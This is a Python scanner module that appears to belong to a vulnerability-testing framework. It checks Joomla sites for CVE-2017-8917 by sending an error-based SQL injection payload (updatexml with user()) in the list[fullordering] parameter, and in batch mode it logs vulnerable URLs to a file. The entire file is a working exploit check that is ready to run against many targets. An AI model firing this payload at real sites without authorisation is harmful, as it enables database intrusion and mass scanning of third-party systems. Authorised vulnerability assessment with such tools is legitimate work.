#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()


class Cve_2017_8917Poc2:
    def run(self,base_url):
        try:
            url = base_url + "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            req.encoding = req.apparent_encoding
            if "XPATH" in req.text:
                OutPrintInfoSuc("Joomla",f"URL: {base_url} 存在SQLi漏洞")
                if self.batch:
                    with open("./result/joomla_2017_8917.txt","a") as w:
                        w.write(f"{base_url}\n")
        except Exception:
            OutPrintInfo("Joomla", "目标请求出错")

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        proxy = target["proxy"]
        self.ssl = target["ssl"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Joomla", "开始检测CVE-2017-8917-POC2...")
        self.run(url)
        if not self.batch:
            OutPrintInfo("Joomla", "CVE-2017-8917-POC2检测结束")

